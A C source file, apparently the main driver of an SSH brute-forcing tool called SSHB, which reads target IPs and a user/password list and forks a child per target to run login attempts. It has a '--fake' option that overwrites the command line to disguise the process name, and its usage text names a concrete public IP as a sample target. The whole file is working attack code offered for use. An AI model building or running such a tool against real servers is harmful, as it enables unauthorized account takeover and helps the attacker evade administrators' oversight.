/*
 * MIT License
 *
 * Copyright (c) 2009 Alexandru Dreptu
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "sshb.h"
#include <errno.h>
#include <getopt.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

FILE *fptr_ipls;
char *fuser_password = "login.list";
char *fake = 0;
int debug = 0; // debug option, for extra messages
int threads = 0;
int max_forks = 10;
int timeout_secs = 15; // time out for connections

// print error string and exit
void fatal(char *opt, int errcode) {
    if (opt) fprintf(stderr, opt);
    fprintf(stderr, "%s\n", strerror(errcode));
    exit(errcode);
}

// print formated debug messages.
void debugf(char *fmt, ...) {
    va_list ap;
    char buff[256];
    int r;

    if (!debug) return;
    va_start(ap, fmt);
    r = vsnprintf(buff, sizeof(buff), fmt, ap);
    va_end(ap);
    if (r == -1) fprintf(stderr, "debug: argument too long");
    fprintf(stderr, buff);
}

void print_help(char *this_prog) {
    printf("\n\n"
           "    .:: SSH Brute Forcer ::.\n"
           "\n"
           " Compilation time: %s ^ %s\n"
           " ASCII chars support only.\n"
           " SSHB Version: 0.2 testing (linux)\n"
           " Use This At Your Own Risk!!\n"
           "\n",
           __DATE__, __TIME__);

    printf(""
           " Options:\n"
           "   --forks <n>       Forks number [default 10]\n"
           "   --fake  <n>       Process fake name\n"
           "   --iplist <n>      IP list file\n"
           "   --threads <n>     Threads number\n"
           "   --passwd <n>      Users-Passwd file [default %s]\n"
           "   --timeout <n>     Time out in seconds [default 15]\n"
           "\n"
           " Usage:\n"
           "   %s [options] [target_ip:port || --iplist <nnn>]\n"
           "   %s [options] 127.0.0.1:24 72.43.180.251\n"
           "   %s [options] --iplist scan.log\n"
           "\n\n",
           fuser_password, this_prog, this_prog, this_prog);

    exit(0);
}

int main(int argc, char *argv[]) {
    int x = -1, y = 0;
    char buff[32] = "";
    char ip_matrix[10][16];
    FILE *fptr_pwdtest;

    // cmd line options
    int option_index = 0;
    struct option long_options[] = {
        {"forks", 1, 0, 1},   {"fake", 1, 0, 2},    {"iplist", 1, 0, 3},
        {"threads", 1, 0, 4}, {"passwd", 1, 0, 5},  {"debug", 0, 0, 6},
        {"help", 0, 0, 7},    {"timeout", 1, 0, 8}, {0, 0, 0, 0}};

    // argc check
    if (argc < 2) {
        printf("Usage: %s [options] target_ip:port\n", argv[0]);
        printf("Try `%s --help' for more information.\n", argv[0]);
        exit(0);
    }

    // parsing cmd line argvs loop
    while ((x = getopt_long(argc, argv, "", long_options, &option_index)) !=
           -1) {
        switch (x) {
        // forks
        case 1:
            max_forks = atoi(optarg);
            break;

        // fake
        case 2:
            fake = (char *)malloc(strlen(optarg));
            memcpy(fake, optarg, strlen(optarg));
            break;

        // iplist
        case 3:
            fptr_ipls = fopen(optarg, "rt");
            if (!fptr_ipls) fatal("Cannot open ip list: ", errno);
            break;

        // threads
        case 4:
            threads = atoi(optarg);
            break;

        // users-password
        case 5:
            fuser_password = (char *)malloc(strlen(optarg));
            memcpy(fuser_password, optarg, strlen(optarg));
            break;

        // debug
        case 6:
            debug = 1;
            break;

        // timeout
        case 8:
            timeout_secs = atoi(optarg);
            break;

        // default
        default: print_help(argv[0]);
        }
    }

    // ip targets backup (it will be erased from cmd line stack)
    memset(ip_matrix, 0x00, sizeof(ip_matrix));
    if (optind < argc) {
        debugf("# optind = %d; argc = %d\n", optind, argc);
        x = 0;
        while (optind < argc) {
            strcpy(ip_matrix[x], argv[optind]);
            optind++;
            x++;
        }
    }

    // cleaning cmd line stack and fake process name
    if (fake) {
        for (x = 0; x < argc; x++) { memset(argv[x], 0x20, strlen(argv[x])); }
        strcpy(argv[0], fake);
    }

    // test usr pwd file
    fptr_pwdtest = fopen(fuser_password, "rt");
    if (!fptr_pwdtest) fatal("Cannot open user & password file: ", errno);
    fclose(fptr_pwdtest);

    // creating forks for cmd line targets
    if (ip_matrix[0][0]) {
        x = 0;
        while (ip_matrix[x][0]) {
            switch (fork()) {

            case 0:
                debugf("# fork cmd line argvs [%d ip_matrix[0][0] (%s)]\n", x,
                       ip_matrix[x]);
                fork_main(ip_matrix[x]); // fork.c
                exit(0);
                break;

            case -1: fatal("# cannot create child: ", errno); break;

            default: x++; debugf("# child %d created.\n", x);
            }
        }

        // wait childs loop
        for (; x > 0; x--) wait(0);
    }

    // loading ips from iplist file and creating forks <= max_forks
    if (fptr_ipls) {
        x = 0;
    loop:
        if (fgets(buff, sizeof(buff), fptr_ipls)) {

            // removing CR LF chars
            for (y = 0; y < strlen(buff); y++) {
                if (buff[y] == '\n' || buff[y] == '\r') buff[y] = 0x00;
            }

            // FIXME: check this loop
            if (buff[0]) {
                switch (fork()) {
                case 0: // here we are in child process
                    fclose(fptr_ipls);
                    fork_main(buff); // fork.c
                    debugf("# I am the child %s [completed].\n", buff);
                    exit(0);
                    break;

                case -1: // cannot create child
                    fatal("# cannot create child: ", errno);
                    break;

                default: // we are still in main function (parent process)
                    x++;
                    debugf("# fork [%d;%s] created.\n", x, buff);
                    break;
                }
            }
        } else {
            debugf("# !fgets(*,*, fptr_ipls)\n");
            // if forks, wait them
            if (x > 0) {
                do {
                    wait(0);
                    debugf("# one child terminated[x>0;X=%d]\n", x);
                    x--;
                } while (x != 0);
            }
            debugf("# going to exit[x>0;X=%d]\n", x);
            goto exit;
        }

        if (x == max_forks) {
            wait(0);
            debugf("# one child terminated[x==max_forks;X=%d]\n", x);
            x--;
        }

        goto loop;
    }

exit:
    // closing file pointer
    if (fptr_ipls) fclose(fptr_ipls);
    return 0;
}
